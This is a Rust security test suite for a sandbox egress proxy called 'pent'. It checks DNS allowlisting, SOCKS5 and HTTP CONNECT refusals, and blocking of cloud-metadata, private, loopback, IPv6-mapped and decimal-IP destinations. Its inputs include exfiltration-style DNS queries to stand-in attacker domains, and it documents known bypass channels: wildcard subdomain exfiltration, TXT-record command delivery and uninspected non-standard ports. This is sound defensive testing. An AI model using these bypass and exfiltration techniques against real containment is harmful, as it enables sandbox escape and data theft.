#![allow(clippy::expect_used, clippy::unwrap_used, clippy::panic)] // integration test: a setup failure should abort the test loudly
//! Security tests for the network containment of pent.
//!
//! These tests drive the real `ProxyServer` on a loopback listener, with a
//! fake upstream DNS server (no internet needed). Each test asserts the
//! secure behaviour. A test that passes proves a defense; it stays as a
//! regression test. A test with `#[ignore = "OPEN VULN NET-<n>"]` keeps a
//! failing assertion that proves the vulnerability.
//!
//! A test named `inherent_*` documents a limit that the design cannot fix.
//! It asserts the current behaviour so that a later change is visible.

use std::io::{Read, Write};
use std::net::{IpAddr, Ipv4Addr, SocketAddr, TcpStream, UdpSocket};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use pent_proxy::{PrivateDestinations, ProxyConfig, ProxyHandle, ProxyPolicy, ProxyServer};

// ── Fake upstream DNS ─────────────────────────────────────────────────────

/// A fake upstream DNS server. It records each queried name and answers A
/// queries with a configured address and TXT queries with a short string.
struct FakeUpstream {
    addr: SocketAddr,
    queried: Arc<Mutex<Vec<String>>>,
}

/// Parse the single question name (lowercase, no trailing dot) and qtype.
fn parse_question(msg: &[u8]) -> Option<(String, u16)> {
    let mut pos = 12usize;
    let mut labels: Vec<String> = Vec::new();
    loop {
        let len = *msg.get(pos)? as usize;
        pos += 1;
        if len == 0 {
            break;
        }
        let label = msg.get(pos..pos + len)?;
        labels.push(String::from_utf8_lossy(label).to_ascii_lowercase());
        pos += len;
    }
    let qtype = u16::from_be_bytes([*msg.get(pos)?, *msg.get(pos + 1)?]);
    Some((labels.join("."), qtype))
}

/// Build a DNS answer. `answer_ip` gives the A record; TXT gets "exfil".
fn build_answer(query: &[u8], qtype: u16, answer_ip: Ipv4Addr) -> Option<Vec<u8>> {
    // Find the end of the question for the echo.
    let mut pos = 12usize;
    loop {
        let len = *query.get(pos)? as usize;
        pos += 1;
        if len == 0 {
            break;
        }
        pos += len;
    }
    let q_end = pos + 4; // qtype + qclass
    let question = query.get(12..q_end)?;

    let mut out = Vec::new();
    out.extend_from_slice(query.get(..2)?); // ID
    out.extend_from_slice(&[0x81, 0x80]); // QR + RD + RA, NOERROR
    out.extend_from_slice(&[0x00, 0x01]); // QDCOUNT
    let have_answer = qtype == 1 || qtype == 16;
    out.extend_from_slice(&(u16::from(have_answer)).to_be_bytes()); // ANCOUNT
    out.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // NS + AR
    out.extend_from_slice(question);
    if qtype == 1 {
        out.extend_from_slice(&[0xC0, 0x0C]); // name pointer
        out.extend_from_slice(&1u16.to_be_bytes()); // A
        out.extend_from_slice(&1u16.to_be_bytes()); // IN
        out.extend_from_slice(&60u32.to_be_bytes()); // TTL
        out.extend_from_slice(&4u16.to_be_bytes()); // RDLEN
        out.extend_from_slice(&answer_ip.octets());
    } else if qtype == 16 {
        out.extend_from_slice(&[0xC0, 0x0C]);
        out.extend_from_slice(&16u16.to_be_bytes()); // TXT
        out.extend_from_slice(&1u16.to_be_bytes());
        out.extend_from_slice(&60u32.to_be_bytes());
        out.extend_from_slice(&6u16.to_be_bytes()); // RDLEN
        out.push(5);
        out.extend_from_slice(b"exfil");
    }
    Some(out)
}

fn spawn_upstream(answer_ip: Ipv4Addr) -> std::io::Result<FakeUpstream> {
    let socket = UdpSocket::bind("127.0.0.1:0")?;
    let addr = socket.local_addr()?;
    let queried = Arc::new(Mutex::new(Vec::new()));
    let queried_c = Arc::clone(&queried);
    std::thread::spawn(move || {
        let mut buf = [0u8; 2048];
        loop {
            let Ok((len, src)) = socket.recv_from(&mut buf) else {
                return;
            };
            let msg = buf[..len].to_vec();
            let Some((name, qtype)) = parse_question(&msg) else {
                continue;
            };
            if let Ok(mut q) = queried_c.lock() {
                q.push(name);
            }
            if let Some(answer) = build_answer(&msg, qtype, answer_ip) {
                let _ = socket.send_to(&answer, src);
            }
        }
    });
    Ok(FakeUpstream { addr, queried })
}

// ── Proxy harness ─────────────────────────────────────────────────────────

struct Harness {
    handle: ProxyHandle,
    proxy_addr: SocketAddr,
    upstream: FakeUpstream,
}

async fn start(
    allowlist: &[&str],
    answer_ip: Ipv4Addr,
    policy: ProxyPolicy,
    private: PrivateDestinations,
) -> Option<Harness> {
    let upstream = spawn_upstream(answer_ip).ok()?;
    let config = ProxyConfig {
        dns_bind_addr: SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 0),
        proxy_bind_addr: SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 0),
        upstream_dns: Some(vec![upstream.addr]),
        domain_allowlist: allowlist.iter().map(|s| (*s).to_string()).collect(),
        policy,
        private_destinations: private,
        handshake_timeout: Duration::from_secs(3),
        tcp_connect_timeout: Duration::from_secs(3),
        ..Default::default()
    };
    let handle = ProxyServer::new(config).ok()?.start().await.ok()?;
    let proxy_addr = handle.proxy_addr()?;
    Some(Harness {
        handle,
        proxy_addr,
        upstream,
    })
}

// ── SOCKS5 / HTTP CONNECT clients ───────────────────────────────────────────

/// Perform the SOCKS5 greeting and send a CONNECT for a domain target.
/// Returns the connected stream and the SOCKS5 reply code.
fn socks5_connect_domain(
    proxy: SocketAddr,
    host: &str,
    port: u16,
) -> std::io::Result<(TcpStream, u8)> {
    let mut s = TcpStream::connect(proxy)?;
    s.set_read_timeout(Some(Duration::from_secs(5)))?;
    s.write_all(&[0x05, 0x01, 0x00])?; // VER, 1 method, NO_AUTH
    let mut greet = [0u8; 2];
    s.read_exact(&mut greet)?;
    let mut req = vec![
        0x05,
        0x01,
        0x00,
        0x03,
        u8::try_from(host.len()).unwrap_or(0),
    ];
    req.extend_from_slice(host.as_bytes());
    req.extend_from_slice(&port.to_be_bytes());
    s.write_all(&req)?;
    let mut reply = [0u8; 10];
    s.read_exact(&mut reply)?;
    Ok((s, reply[1]))
}

/// SOCKS5 CONNECT for an IPv4 literal target.
fn socks5_connect_ipv4(
    proxy: SocketAddr,
    ip: Ipv4Addr,
    port: u16,
) -> std::io::Result<(TcpStream, u8)> {
    let mut s = TcpStream::connect(proxy)?;
    s.set_read_timeout(Some(Duration::from_secs(5)))?;
    s.write_all(&[0x05, 0x01, 0x00])?;
    let mut greet = [0u8; 2];
    s.read_exact(&mut greet)?;
    let mut req = vec![0x05, 0x01, 0x00, 0x01];
    req.extend_from_slice(&ip.octets());
    req.extend_from_slice(&port.to_be_bytes());
    s.write_all(&req)?;
    let mut reply = [0u8; 10];
    s.read_exact(&mut reply)?;
    Ok((s, reply[1]))
}

/// Send a raw HTTP CONNECT request and return the status line.
fn http_connect(proxy: SocketAddr, target: &str) -> std::io::Result<(TcpStream, String)> {
    let mut s = TcpStream::connect(proxy)?;
    s.set_read_timeout(Some(Duration::from_secs(5)))?;
    s.write_all(format!("CONNECT {target} HTTP/1.1\r\nHost: {target}\r\n\r\n").as_bytes())?;
    let mut buf = [0u8; 256];
    let n = s.read(&mut buf).unwrap_or(0);
    Ok((s, String::from_utf8_lossy(&buf[..n]).into_owned()))
}

/// A victim TCP server on loopback. It sends a banner to each client.
fn spawn_victim(banner: &'static [u8]) -> std::io::Result<SocketAddr> {
    let listener = std::net::TcpListener::bind("127.0.0.1:0")?;
    let addr = listener.local_addr()?;
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut stream) = stream else { continue };
            let _ = stream.write_all(banner);
        }
    });
    Ok(addr)
}

const PUBLIC_IP: Ipv4Addr = Ipv4Addr::new(93, 184, 216, 34); // documentation IP

// ── Tests: DNS filtering ────────────────────────────────────────────────────

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn disallowed_name_gets_nxdomain_and_is_not_forwarded_upstream() {
    let Some(h) = start(
        &["allowed.example.com"],
        PUBLIC_IP,
        ProxyPolicy::Enforce,
        PrivateDestinations::Deny,
    )
    .await
    else {
        return;
    };
    let dns = h.handle.dns_addr().expect("dns addr");

    // Query a disallowed name over UDP.
    let client = UdpSocket::bind("127.0.0.1:0").expect("bind client");
    client.set_read_timeout(Some(Duration::from_secs(3))).ok();
    let query = build_query("secret-data.evil.example", 1);
    client.send_to(&query, dns).expect("send");
    let mut buf = [0u8; 512];
    let (n, _) = client.recv_from(&mut buf).expect("recv");
    let rcode = buf[3] & 0x0F;
    assert_eq!(rcode, 3, "disallowed name must get NXDOMAIN");
    assert!(n >= 12);

    // The upstream must never have seen the disallowed name.
    tokio::time::sleep(Duration::from_millis(100)).await;
    let forwarded = {
        let queried = h.upstream.queried.lock().expect("lock");
        queried.iter().any(|q| q.contains("evil.example"))
    };
    assert!(!forwarded, "the proxy forwarded a disallowed name upstream");
    drop(h);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn inherent_dns_subdomain_exfil_under_allowed_wildcard() {
    // A wildcard allowlist lets the child put arbitrary data in the labels
    // of a subdomain. The proxy forwards the query upstream, where an
    // attacker name server reads the data. This is an inherent limit of a
    // domain allowlist: the query itself is the channel.
    let Some(h) = start(
        &["*.example.com"],
        PUBLIC_IP,
        ProxyPolicy::Enforce,
        PrivateDestinations::Deny,
    )
    .await
    else {
        return;
    };
    let dns = h.handle.dns_addr().expect("dns addr");
    let client = UdpSocket::bind("127.0.0.1:0").expect("bind client");
    client.set_read_timeout(Some(Duration::from_secs(3))).ok();
    let query = build_query("c2-exfil-payload.example.com", 1);
    client.send_to(&query, dns).expect("send");
    let mut buf = [0u8; 512];
    let _ = client.recv_from(&mut buf);
    tokio::time::sleep(Duration::from_millis(100)).await;
    let forwarded = {
        let queried = h.upstream.queried.lock().expect("lock");
        queried.iter().any(|q| q == "c2-exfil-payload.example.com")
    };
    assert!(
        forwarded,
        "a wildcard forwards the subdomain upstream (inherent)"
    );
    drop(h);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn inherent_txt_record_for_allowed_name_is_a_receive_channel() {
    // A TXT query for an allowed name is forwarded and the answer returns.
    // An attacker name server for an allowed domain can send commands in a
    // TXT record. This is inherent: the proxy cannot read the meaning of a
    // record for an allowed name.
    let Some(h) = start(
        &["allowed.example.com"],
        PUBLIC_IP,
        ProxyPolicy::Enforce,
        PrivateDestinations::Deny,
    )
    .await
    else {
        return;
    };
    let dns = h.handle.dns_addr().expect("dns addr");
    let client = UdpSocket::bind("127.0.0.1:0").expect("bind client");
    client.set_read_timeout(Some(Duration::from_secs(3))).ok();
    let query = build_query("allowed.example.com", 16); // TXT
    client.send_to(&query, dns).expect("send");
    let mut buf = [0u8; 512];
    let (n, _) = client.recv_from(&mut buf).expect("recv");
    assert!(
        buf[..n].windows(5).any(|w| w == b"exfil"),
        "the TXT answer returns to the client (inherent receive channel)"
    );
    drop(h);
}

// ── Tests: TCP allowlist and connect ────────────────────────────────────────

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn socks5_connect_to_disallowed_domain_is_refused() {
    let Some(h) = start(
        &["allowed.example.com"],
        PUBLIC_IP,
        ProxyPolicy::Enforce,
        PrivateDestinations::Deny,
    )
    .await
    else {
        return;
    };
    let (_s, code) = socks5_connect_domain(h.proxy_addr, "evil.example.com", 443).expect("connect");
    assert_eq!(
        code, 0x02,
        "a disallowed domain must get CONNECTION_NOT_ALLOWED"
    );
    drop(h);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn http_connect_to_disallowed_domain_is_forbidden() {
    let Some(h) = start(
        &["allowed.example.com"],
        PUBLIC_IP,
        ProxyPolicy::Enforce,
        PrivateDestinations::Deny,
    )
    .await
    else {
        return;
    };
    let (_s, status) = http_connect(h.proxy_addr, "evil.example.com:443").expect("connect");
    assert!(
        status.contains("403"),
        "disallowed CONNECT must be 403: {status:?}"
    );
    drop(h);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn non_connect_http_proxy_request_is_rejected() {
    // A plain HTTP proxy request (absolute-URI GET) must not work: the proxy
    // supports only CONNECT and SOCKS5. Otherwise the child could fetch
    // `GET http://evil/` and the host would never be checked as a tunnel.
    let Some(h) = start(
        &["allowed.example.com"],
        PUBLIC_IP,
        ProxyPolicy::Enforce,
        PrivateDestinations::Deny,
    )
    .await
    else {
        return;
    };
    let mut s = TcpStream::connect(h.proxy_addr).expect("connect");
    s.set_read_timeout(Some(Duration::from_secs(5))).ok();
    s.write_all(b"GET http://evil.example.com/ HTTP/1.1\r\nHost: evil.example.com\r\n\r\n")
        .expect("write");
    let mut buf = [0u8; 256];
    let n = s.read(&mut buf).unwrap_or(0);
    let status = String::from_utf8_lossy(&buf[..n]);
    assert!(
        n == 0 || !status.contains("200"),
        "a non-CONNECT proxy request must not succeed: {status:?}"
    );
    assert!(
        status.is_empty() || status.contains("400") || status.contains("403"),
        "expected an error or a closed connection: {status:?}"
    );
    drop(h);
}

// ── Tests: non-public destinations / DNS rebinding ──────────────────────────

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn socks5_ip_literal_to_cloud_metadata_is_blocked() {
    // The cloud metadata address 169.254.169.254 is link-local. A direct IP
    // connect to it must be refused, also for an allowed allowlist.
    let Some(h) = start(
        &["allowed.example.com"],
        PUBLIC_IP,
        ProxyPolicy::Enforce,
        PrivateDestinations::Deny,
    )
    .await
    else {
        return;
    };
    let meta = Ipv4Addr::new(169, 254, 169, 254);
    let (_s, code) = socks5_connect_ipv4(h.proxy_addr, meta, 80).expect("connect");
    assert_eq!(code, 0x02, "the metadata address must be blocked");
    drop(h);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn allowed_name_that_resolves_to_loopback_is_blocked() {
    // The TCP proxy resolves a domain target through the OS resolver, so the
    // test uses "localhost", which resolves to 127.0.0.1. With an allowed
    // allowlist that holds "localhost", the non-public rule must still block
    // the connection, because the resolved address is loopback. This proves
    // the defense against a DNS rebinding to the host.
    let Some(h) = start(
        &["localhost"],
        PUBLIC_IP,
        ProxyPolicy::Enforce,
        PrivateDestinations::Deny,
    )
    .await
    else {
        return;
    };
    let (_s, code) = socks5_connect_domain(h.proxy_addr, "localhost", 80).expect("connect");
    assert_eq!(
        code, 0x02,
        "a name that resolves to loopback must be blocked"
    );
    drop(h);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn socks5_ip_literal_to_private_is_blocked() {
    let Some(h) = start(
        &["allowed.example.com"],
        PUBLIC_IP,
        ProxyPolicy::Enforce,
        PrivateDestinations::Deny,
    )
    .await
    else {
        return;
    };
    let (_s, code) =
        socks5_connect_ipv4(h.proxy_addr, Ipv4Addr::new(10, 0, 0, 1), 80).expect("connect");
    assert_eq!(code, 0x02, "a private IP literal must be blocked");
    drop(h);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn socks5_ipv6_mapped_loopback_literal_is_blocked() {
    // ::ffff:127.0.0.1 is an IPv4-mapped IPv6 address that reaches loopback.
    // The classifier must map it to the IPv4 form and block it.
    let Some(h) = start(
        &["allowed.example.com"],
        PUBLIC_IP,
        ProxyPolicy::Enforce,
        PrivateDestinations::Deny,
    )
    .await
    else {
        return;
    };
    let mut s = TcpStream::connect(h.proxy_addr).expect("connect");
    s.set_read_timeout(Some(Duration::from_secs(5))).ok();
    s.write_all(&[0x05, 0x01, 0x00]).expect("greet");
    let mut greet = [0u8; 2];
    s.read_exact(&mut greet).expect("greet reply");
    let mapped = std::net::Ipv6Addr::new(0, 0, 0, 0, 0, 0xffff, 0x7f00, 0x0001);
    let mut req = vec![0x05, 0x01, 0x00, 0x04];
    req.extend_from_slice(&mapped.octets());
    req.extend_from_slice(&80u16.to_be_bytes());
    s.write_all(&req).expect("request");
    let mut reply = [0u8; 10];
    s.read_exact(&mut reply).expect("reply");
    assert_eq!(
        reply[1], 0x02,
        "an IPv4-mapped loopback literal must be blocked"
    );
    drop(h);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn socks5_ip_literal_not_in_cache_is_blocked() {
    // A public IP literal that no allowed name resolved to has no domain in
    // the cache, so enforce mode must refuse it.
    let Some(h) = start(
        &["allowed.example.com"],
        PUBLIC_IP,
        ProxyPolicy::Enforce,
        PrivateDestinations::Deny,
    )
    .await
    else {
        return;
    };
    let (_s, code) =
        socks5_connect_ipv4(h.proxy_addr, Ipv4Addr::new(203, 0, 113, 7), 443).expect("connect");
    assert_eq!(
        code, 0x02,
        "an uncached public IP must be blocked in enforce mode"
    );
    drop(h);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn http_connect_decimal_ip_form_is_not_resolved_to_loopback() {
    // `2130706433` is the decimal form of 127.0.0.1. The proxy must not
    // treat it as that IP. It becomes a one-label name, which the allowlist
    // refuses.
    let Some(h) = start(
        &["allowed.example.com"],
        Ipv4Addr::LOCALHOST,
        ProxyPolicy::Enforce,
        PrivateDestinations::Allow,
    )
    .await
    else {
        return;
    };
    let (_s, status) = http_connect(h.proxy_addr, "2130706433:80").expect("connect");
    assert!(
        !status.contains("200"),
        "a decimal IP string must not reach loopback: {status:?}"
    );
    drop(h);
}

// ── Tests: SNI / Host inspection ────────────────────────────────────────────

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn inherent_ports_other_than_443_and_80_get_no_host_inspection() {
    // The proxy reads the TLS SNI or the HTTP Host header only on port 443
    // and port 80. On any other port of an allowed domain, the child can
    // send arbitrary bytes with no host check. The traffic still goes only
    // to the allowed domain's own resolved address, but the proxy cannot see
    // what protocol or host it carries. This documents the behaviour; a
    // victim binds a high port because an unprivileged test cannot bind 443.
    let victim = match spawn_victim(b"VICTIM-ANY-PORT") {
        Ok(a) => a,
        Err(_) => return,
    };
    let Some(h) = start(
        &["localhost"],
        PUBLIC_IP,
        ProxyPolicy::Enforce,
        PrivateDestinations::Allow,
    )
    .await
    else {
        return;
    };
    let (mut s, code) =
        socks5_connect_domain(h.proxy_addr, "localhost", victim.port()).expect("connect");
    assert_eq!(
        code, 0x00,
        "the allowed domain connects on a non-standard port"
    );
    // The proxy relays without reading a ClientHello, because the port is
    // not 443. We receive the victim banner with no inspection.
    let mut buf = [0u8; 32];
    let n = s.read(&mut buf).unwrap_or(0);
    assert!(
        buf[..n].windows(6).any(|w| w == b"VICTIM"),
        "the bytes flow with no host inspection on a non-standard port"
    );
    drop(h);
}

// ── DNS query builder (client side) ─────────────────────────────────────────

fn build_query(name: &str, qtype: u16) -> Vec<u8> {
    let mut q = Vec::new();
    q.extend_from_slice(&[0x12, 0x34]); // ID
    q.extend_from_slice(&[0x01, 0x00]); // RD
    q.extend_from_slice(&[0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
    for label in name.split('.') {
        q.push(u8::try_from(label.len()).unwrap_or(0));
        q.extend_from_slice(label.as_bytes());
    }
    q.push(0);
    q.extend_from_slice(&qtype.to_be_bytes());
    q.extend_from_slice(&1u16.to_be_bytes());
    q
}
